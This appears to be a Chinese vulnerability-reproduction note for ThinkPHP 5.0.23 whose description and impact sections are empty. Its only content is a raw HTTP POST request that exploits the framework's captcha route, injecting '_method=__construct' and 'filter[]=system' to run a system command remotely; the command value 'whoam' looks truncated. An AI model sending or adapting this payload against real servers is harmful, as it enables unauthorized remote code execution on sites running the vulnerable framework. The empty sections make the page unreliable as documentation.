Thinkphp 5.0.23
===============

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    POST /index.php?s=captcha HTTP/1.1
    Host: yuorip
    Accept-Encoding: gzip, deflate
    Accept: */* Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 72


    _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoam
